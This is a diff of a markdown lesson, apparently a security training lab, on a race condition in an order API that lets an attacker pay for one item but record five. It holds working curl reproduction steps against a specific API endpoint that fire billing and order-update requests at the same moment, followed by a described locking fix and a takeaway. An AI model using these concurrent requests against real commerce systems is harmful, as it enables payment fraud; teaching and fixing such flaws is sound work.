@@ -5,20 +5,24 @@
 By sending a billing request and an order update request at the exact same time, an attacker can pay for 1 item but have 5 recorded in the order.
 
 ## How to Reproduce
+1. We set the API URL and token:
 ```bash
 export API="https://nuxbyqip03.execute-api.us-east-1.amazonaws.com/Stage/order"
 export TOKEN= #we add the token 
-
-#Create order
+```
+2. Create order
+```bash
 curl -s "$API" -H "content-type: application/json" -H "authorization: $TOKEN" \
   -d '{"action":"new","cart-id":"race-cart-001","items":{"1":1}}' | jq
-
-#Add shipping
+```
+3. Add shipping
+```bash
 export ORDER_ID= #we add the order id 
 curl -s "$API" -H "content-type: application/json" -H "authorization: $TOKEN" \
   -d '{"action":"shipping","order-id":"'"$ORDER_ID"'","data":{"address":"123 Test St","email":"test@test.com","name":"Test User"}}' | jq
-
-#Send billing and update
+```
+4. Send billing and update
+```bash
 curl -s "$API" -H "content-type: application/json" -H "authorization: $TOKEN" \
   -d '{"action":"billing","order-id":"'"$ORDER_ID"'","data":{"ccn":"4242424242424242","exp":"11/25","cvv":"123"}}' | jq &
 
@@ -68,3 +72,6 @@ except Exception as e:
 This locks the order immediately when billing starts so no updates happen.
 
 ![Diagram](assets/AfterFix.png)
+
+## Takeaway
+This lesson demonstrates that race conditions can lead to serious security issues. When operations are not properly synchronized, concurrent requests can bypass intended workflow rules and create inconsistent states. Enforcing validation at the database level ensures that critical conditions are checked and applied together, preventing timing-based exploits.
